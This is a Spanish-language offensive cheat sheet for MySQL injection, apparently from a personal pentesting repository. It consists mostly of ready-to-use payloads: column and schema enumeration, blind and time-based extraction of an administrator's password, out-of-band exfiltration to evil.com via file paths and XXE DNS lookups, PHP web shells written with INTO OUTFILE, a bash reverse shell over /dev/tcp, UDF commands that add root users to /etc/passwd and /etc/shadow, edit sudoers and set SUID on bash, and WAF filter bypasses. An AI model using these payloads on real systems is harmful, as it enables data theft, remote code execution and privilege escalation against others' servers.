# Inyeccion MySQL 

# Indice
- [Bases de datos por defecto](#Bases-de-datos-por-defecto)
- [Metodologia](#Metodologia)
- [Union based](#Union-based)
    - [Deteccion del numero de columnas](#Deteccion-del-numero-de-columnas)
    - [Enumeracion de la base de datos con information_schema](#Enumeracion-de-la-base-de-datos-con-information-schema)
- [Error based](#Error-based)
- [Blind](#Blind)
  - [Confirmacion en la respuesta](#Confirmacion-en-la-respuesta)
  - [Time Based](#Time-Based)
- [Out of band](#Out-of-band)
- [SQLI to RCE](#SQLI-to-RCE)
    - [MYSQL Leer el contenido de un archivo](#MYSQL-Leer-el-contenido-de-un-archivo)
    - [MYSQL PHP Shell](#MYSQL-PHP-Shell)
      - [Outfile](#Outfile)
      - [Dumpfile](#Dumpfile)
      - [Passthru](#Passthru)
    - [MYSQL UDF](#MYSQL-UDF)
       - [UDF Simple](#UDF-Simple)
       - [Exploits publicos](#Exploits-publicos)
- [Filter Bypass](#Filter-Bypass)
    - [XML Encoding](#XML-Encoding)
- [Referencias](#Referencias)



# Bases de datos por defecto

|Name|Description|
|---|---|
|mysql|Requiere permisos root|
|information_schema|Disponible desde la version 5 y superiores|

# Metodologia
Normalmente al encontrar una vulnerabilidad de inyeccion SQL siempre vamos a seguir el mismo orden
1. Enumeracion de columnas
2. Enumeracion de columnas que imprimen contenido
3. Enumeracion de version, nombre de usuario, nombre de la base de datos, etc
4. Enumeracion de bases de datos
5. Enumeracion de tablas
6. Enumeracion de columnas
7. Dumpeo de datos
   

# Union based
## Deteccion del numero de columnas

Podemos usar `order by` o `group by`

````sql
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
````

````sql
1' GROUP BY 1--
1' GROUP BY 2--
1' GROUP BY 3--
````

> El numero correcto lo sabremos al obtener una respuesta que confirme que la query es falsa, es decir que el numero de columnas no existe:
- Error de SQL
- Cambio en el contenido de la respuesta (pueden aparecer o desaparecer cosas)
- Cambio en el Content-Length

ERROR BASED
> Estos metodos funcionan si el mostrar errores esta habilitado

`UNION SELECT`

````sql
1' UNION SELECT @--+        #The used SELECT statements have a different number of columns
1' UNION SELECT @,@--+      #The used SELECT statements have a different number of columns
1' UNION SELECT @,@,@--+    #Repetir este proceso hasta que no obtengamos errores 1 @ = 1 columna
````

`LIMIT INTO`

````sql
1' LIMIT 1,1 INTO @--+        #The used SELECT statements have a different number of columns
1' LIMIT 1,1 INTO @,@--+      #The used SELECT statements have a different number of columns
1' LIMIT 1,1 INTO @,@,@--+    #Repetir este proceso hasta que no obtengamos errores 1 @ = 1 columna
````

`SELECT * FROM TABLA`
> Para este metodo necesitamos saber el nombre de la tabla

````sql
1' AND (SELECT * FROM Users) = 1--+ 	#Operand should contain 3 column(s)
````



## Enumeracion de la base de datos con information_schema

````sql
UniOn Select 1,2,schema_name+fRoM+information_schema.schemata
UniOn Select 1,2,table_name+fRoM+information_schema.tables+wHeRe+table_schema=<nombre_bd>
UniOn Select 1,2,column_name+fRoM+information_schema.columns+wHeRe+table_name=<tabla>
UniOn Select 1,data,user,password+fRoM+<tabla>
````

En caso que solo tengamos una columna para imprimir contenido podemos usar 'group_concat' para pedir en la misma consulta varios campos
````sql
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C,user,0x7C,password)+fRoM+<tabla>
````

> En el caso de tener una inyeccion valida en uno de los valores de una columna y queramos ver todos los valores de esa columna podemos usar LIMIT para extraerlos linea a linea en caso que no sea posible visualizar todo el contenido.

Ejemplo:

````sql
SELECT * from users where email = '{input email}';
````
Usariamos la condicion verdadera 'or 1=1 para ignorar la consulta del campo email y que nos devuelva todos los emails de los usuarios
````sql
SELECT * from users where email = 'test@test.com' or 1=1;-- -';
  <h2> User not found with that email!
````
Al no ser posible obtener todos los valores de la columna usaremos el `LIMIT` para obtener el de cada linea.
````sql
' or 1=1 LIMIT 0,1;-- -';
' or 1=1 LIMIT 1,1;-- -';
' or 1=1 LIMIT 2,1;-- -';
' or 1=1 LIMIT 3,1;-- -';
' or 1=1 LIMIT 4,1;-- -';
' or 1=1 LIMIT 5,1;-- -';
````

Esto lo podemos realizar de manera automatica con un bucle for
````bash
for i in $(seq 1 500);
do curl -s -X POST http://x.x.x.x/test.php --data-urlencode "email=test@test.com' or 1=1 limit $i,1-- -" |grep "\<h2>" | sed 's/^ *//';
done
````

`NOT LIKE`

Este operador nos puede servir para filtrar resultados de consultas o enumerar mediante descarte lineas de tablas o columnas en caso que no podamos verlas en su totalidad

````sql
' UNION select 1,group_concat(username,password),3,4 from users where username NOT LIKE \"john\" -- -

' UNION select 1,table_name,3,4 from information_schema.tables where table_name NOT LIKE \"tablaX\"-- -
 Resultado: Tabla1
' UNION select 1,table_name,3,4 from information_schema.tables where table_name NOT LIKE \"tabla1\"-- -
 Resultado: Tabla2
' UNION select 1,table_name,3,4 from information_schema.tables where table_name NOT LIKE \"tabla2\"-- -
 Resultado: Tabla3
````

# Error based

````sql
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
````

# Blind

## Confirmacion en la respuesta
En esta seccion nuestra confirmacion de que la consulta ha tenido exito la obtendremos igual que en las UNION BASED teniendo un cambio en el contenido de la pagina:

- Error de SQL
- Cambio en el contenido de la respuesta (pueden aparecer o desaparecer cosas)
- Cambio en el Content-Length

> Mediante el uso de igualdades y condiciones podemos ir enumerando la base de datos en función de la respuesta que obtengamos, nunca obtendremos un output por lo que nosotros deberemos ir preguntando a la página sobre tablas o columnas existentes y ella nos dará una respuesta afirmativa o negativa, podemos automatizarlos con diccionarios de nombres de tablas y columnas o enumerando caracter a caracter cada valor.

````sql
# Existencia de una tabla
' AND (SELECT 'a' FROM users LIMIT 1)='a
````
> La cláusula "SELECT 'a' FROM users LIMIT 1" extrae una sola fila de la tabla "users" y devuelve el valor "a" como resultado de la consulta.  La condición "(SELECT 'a' FROM users LIMIT 1)='a'" verifica si ese valor es igual a "a".De esta manera si la condición se cumple confirmaremos que la tabla users existe

````sql
# Enumeracion de columnas
' AND (SELECT 'a' FROM information_schema.columns WHERE table_name='users' AND column_name='username')='a

# Enumeracion de valores de la columna
' AND (SELECT 'a' FROM users WHERE username='administrator')='a

# Hayar longitud de un campo
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a

# Hayar los caracteres de cada valor
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='m
````

> La diferencia principal entre estas dos ultimas consultas es la manera en que la información se extrae de la columna "password". La primera consulta utiliza la función SUBSTRING para extraer el primer carácter de la cadena almacenada en la columna "password". La segunda consulta también utiliza la función SUBSTRING, pero en lugar de comparar el primer carácter con un valor específico, se compara con una condición de mayor que (" > ") el valor "a".

A partir de aqui la manera mas eficiente de dumpear todos los caracteres es mediante fuerza bruta, lo haremos con la ClusterBomb de BurpSuite 

````sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
````
Para el primer valor usaremos una lista numerica del 1 al 20 ya que es la longitud de nuestro campo y para el segundo una alfanumerica


![image](https://github.com/n3masyst/Pentesting/assets/133997401/464aaddb-c649-4011-8d42-41cc6ea9698e)

![image](https://github.com/n3masyst/Pentesting/assets/133997401/0caedf94-60ed-4466-bffa-5de3062ebd92)


## Time based
Para explotar este tipo de inyeccion SQL usaremos la funcion `sleep` como confirmacion al pedir los datos de manera que si la request tarda en realizarse x segundos confirmaremos la vulnerabilidad.


Seguiremos empleando condicionales

````sql
select+case+when+(<CONDITION>)+THEN+<ACTION DE CONFIRMACION V>+ELSE+<ACTION DE CONFIRMACION F>+END from <table>--
````

Una vez encontrado el campo inyectable confirmaremos el time based con la siguiente consulta simple

````sql
‘|| sleep(10)--
````

A continuación para conseguir información de la base de datos emplearemos condicionales usando la query de ejemplo, primero confirmaremos que la condición funciona con 1=1 
````sql
select+case+when+(1=1)+THEN+sleep(10)+ELSE+sleep(0)>+END--
````

Viendo que la request tarda 10 segundos confirmamos que funciona ahora vamos a enumerar la base de datos sabiendo que en la tabla users hay un usuario llamado administrator
````sql
# Confirmacion que el valor del campo username existe
select+case+when+(userame=’administrator’)+THEN+sleep(10)+ELSE+sleep(0)>+END from users--

# Hayamos la longitud de la contraseña
select+case+when+(userame=’administrator’ AND LENGTH(password)><1,2,3,...>)+THEN+sleep(10)+ELSE+sleep(0)>+END from users--

# Hayar todos los caracteres de la contraseña (longitud = 20)
select+case+when+(userame=’administrator’ AND SUBSTRING(password,1,1)='a')+THEN+sleep(10)+ELSE+sleep(0)>+END from users–
````

> No olvidar indicar el usuario del que queremos la contraseña ya que si no cojera la de cualquier campo.

A partir de aqui la manera mas eficiente de dumpear todos los caracteres es mediante fuerza bruta, lo haremos con la ClusterBomb de BurpSuite 
````sql
select+case+when+(userame=’administrator’ AND SUBSTRING(password,§1§,1)='§a§')+THEN+sleep(10)+ELSE+sleep(0)>+END from users–
````

> Importante indicar que envie una sola request por intento

![image](https://github.com/n3masyst/Pentesting/assets/133997401/bbb2d244-2233-412f-b7f0-10c894fcfe85)

# Out of band
> La inyección SQL Blind Out-of-Band es una técnica utilizada en ataques de inyección de SQL que no requiere de la respuesta del servidor web, sino que utiliza canales de comunicación alternativos para extraer información de la base de datos del servidor. Esta técnica es similar a la inyección SQL blind tradicional, pero en lugar de utilizar las respuestas HTTP del servidor para extraer información, utiliza un canal de comunicación alternativo como DNS, correo electrónico, HTTP, FTP, etc.

````sql
select @@version into outfile '\\\\evil.com\\temp\\out.txt';
select @@version into dumpfile '\\\\evil.com\\temp\\out.txt
````
Explotacion de la base de datos a partir de un XXE

Primero probamos la conexion enviando una consulta que permita un simple DNS lookup
````sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://evil.com/"> %remote;]>'),'/l') FROM mysql —
````
A continuacion inyectaremos la consulta en el subdominio 
````sql
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.evil.com/">+%25remote%3b]>'),'/l')+FROM+dual--
````

# SQLI to RCE
## MYSQL Leer el contenido de un archivo

````sql
' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
' UNION SELECT 1,2,LOAD_FILE('/etc/passwd') --
```

````sql
UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
````

Si somos `root` en la base de datos, podemos activar la propiedad `LOAD_FILE` usando la query:

````sql
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
````

## MYSQL PHP Shell

###  Outfile 

````sql
UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
("<?php echo shell_exec($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'    # Windows
SELECT "<?php exec (\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.49.181/443 0>&1'\");?>" into outfile "/var/www/https/blogblog/wp-content/uploads/test.php";   # Linux
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
````

### Dumpfile

````sql
UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
````

### Passthru
````sql
("<?php echo passthru($_GET['cmd']);") INTO OUTFILE ‘<path>’
````

## MYSQL UDF

Checklist:

1. Verificar que mysql tenga el plugin de UDF instalado
````bash
ls -la /usr/lib/lib_mysqludf_sys.so 
````
2. El usuario root tiene la contraaseña en blanco
3. Mysql esta corriendo con permisos root

### UDF Simple

Usando `sys_exec`

````sql
# Dar permisos SUID  a la bash
select sys_exec('chmod u+s /bin/bash');

# Sobreescribir /etc/shadow
select sys_exec('echo "test:$6$gmSQKZRp$.T7LrOiLvT66Vqo5NwXB/ne/UgxmQzd46MpMUK67CkMrXDi0xvVg8Hd/h3PXpvFP3DvMsLLrhl7.C42/v93c0.:17921::::::" >> /etc/shadow');

# Sobreescribir /etc/shadow
select sys_exec('echo "aarti:$1$cJ05ZYPP$06zg1KtuJ/CbzTWPmeyNH1:0:0:root:/root:/bin/bash" >> /etc/passwd');

# Sobreescribir /etc/sudoers
select sys_exec('echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers');

# Sobreescribir authorized_keys coon nuestra clave publica
select sys_exec('cat id_rsa.pub >> authorized_keys');
````


Usando `sys_eval`

Crearemos una función llamada `syseval` utilizando la extensión `lib_mysqludf_sys.so`. Esta función permite ejecutar comandos del sistema operativo desde una consulta de MySQL.
La extensión `lib_mysqludf_sys.so` es una biblioteca de usuario definida (User Defined Function, UDF) para MySQL que proporciona una interfaz para llamar a funciones del sistema operativo desde consultas de MySQL. En este caso, la función `syseval` está configurada para devolver un valor entero (INT).

Primero necesitamos una base de datos valida 
````sql
CREATE FUNCTION sys_eval RETURNS INT SONAME 'lib_mysqludf_sys.so';
````
Una vez creada la funcion ya podemos ejecutar comandos a traves de ella

````sql
select sys_eval("chmod u+s /bin/bash");
select sys_eval("echo "test:$6$gmSQKZRp$.T7LrOiLvT66Vqo5NwXB/ne/UgxmQzd46MpMUK67CkMrXDi0xvVg8Hd/h3PXpvFP3DvMsLLrhl7.C42/v93c0.:17921::::::" >> /etc/shadow");
select sys_eval("echo "aarti:$1$cJ05ZYPP$06zg1KtuJ/CbzTWPmeyNH1:0:0:root:/root:/bin/bash" >> /etc/passwd");
select sys_eval("echo "aarti:$1$cJ05ZYPP$06zg1KtuJ/CbzTWPmeyNH1:0:0:root:/root:/bin/bash" >> /etc/passwd");
select sys_eval("echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers");
select sys_eval("cat id_rsa.pub >> authorized_keys");
````

### Exploits publicos

Primero debemos identificar que version de MySQL esta ejecutandose y una vez identificada elegir el exploit correcto 
![image](https://github.com/n3masyst/Pentesting/assets/133997401/212417d0-09fd-4112-8116-5697e5df29ef)

1. Descargaremos el exploit a la maquina victima y lo compilaremos dentro
````sql
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
````

2. Consultamos si esta configurada la carpeta de plugins
````sql
show variables like '%plugin%';
````
3. Seguir los pasos del exploit
````sql
 * mysql> use mysql;
 * mysql> create table foo(line blob);
 * mysql> insert into foo values(load_file('/tmp/raptor_udf2.so'));
 * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
 * mysql> create function do_system returns integer soname 'raptor_udf2.so';
 * mysql> select * from mysql.func;
 * +-----------+-----+----------------+----------+
 * | name      | ret | dl             | type     |
 * +-----------+-----+----------------+----------+
 * | do_system |   2 | raptor_udf2.so | function |
 * +-----------+-----+----------------+----------+
 * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
````

4. Una vez creada la funcion `do_system` en vez de ver el contenido de la tabla la usaremos para ejecutar comandos
````sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
select do_system('echo "pass123" | passwd --stdin root');
````

* [Explotacion automatica](https://packetstormsecurity.com/files/151369/MySQL-User-Defined-Linux-x32-x86_64-sys_exec-Privilege-Escalation.html)

# Filter Bypass

Para identificar la existencia de un filtro basado en palabras o comandos de SQL primero debemos tener una confirmacion de que la consulta se esta ejecutando correctamente (error, output, tiempo de respuesta).

Procederemos a poner los comandos de SQL que sospechamos pueden estar siendo bloqueadas despues del comentario -- -

````sql
' order by 5-- -test
  MySQL error ...

' order by 5-- -union
  (Sin respuesta)

' order by 5-- -select
' order by 5-- -limit
' order by 5-- -group_concat
````

Una vez identificado el componente que filtra podemos ofuscarlo mediante varias tecnicas


- Intercalando mayusculas y minusculas
````sql
' UnIOn select 1,2,3,4 -- -
````
- Hexadecimal
Permite bypassear las "" a la hora de especificar una tabla o columna
````sql
echo -n "tabla" | xxd -ps
UniOn Select 1,2,3,table_name+fRoM+information_schema.tables+wHeRe+table_schema=0x7573657273-- -
````

## XML Encoding
> Es importante tener en cuenta que puede realizar ataques de inyección SQL utilizando cualquier entrada controlable que la aplicación procese como una consulta SQL. Por ejemplo, algunos sitios web aceptan entradas en formato JSON o XML y las usan para consultar la base de datos. Estos diferentes formatos pueden incluso proporcionar formas alternativas para ofuscar ataques que de otro modo estarían bloqueados debido a WAF y otros mecanismos de defensa

Request original:
````xml
<?xml version="1.0" encoding="UTF-8" ?>
    <stockCheck>
        <productId>
            9
        </productId>
        <storeId>
            1
        </storeId>
    </stockCheck>
````

El punto de inyeccion es 'storeId', primero veremos cómo el input es evaluado

````xml
<?xml version="1.0" encoding="UTF-8" ?>
    <stockCheck>
        <productId>
            9
        </productId>
        <storeId>
            1 UNION SELECT NULL
        </storeId>
    </stockCheck>
````

![image](https://github.com/n3masyst/Pentesting/assets/133997401/776017cc-a7a9-4b19-9410-1ca27428086a)


Para evadir esta proteccion usaremos encriptacion hexadecimal la cual podemos aplicar manualmente o con un plugin de BurpSuite [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100)

Extensions>Hackvertor>Encode>hex_entities
![image](https://github.com/n3masyst/Pentesting/assets/133997401/c4707f08-bf05-4ca0-9170-656156dfe3ed)
![image](https://github.com/n3masyst/Pentesting/assets/133997401/33a65985-1545-4921-b7e1-d2595d899c54)

Manual
````xml
<?xml version="1.0" encoding="UTF-8" ?>
    <stockCheck>
        <productId>
            9
        </productId>
        <storeId>
            1 &#x53;ELECT * FROM information_schema.tables
        </storeId>
    </stockCheck>
````



# Referencias
- [Portswigger SQL Injection Cheetsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
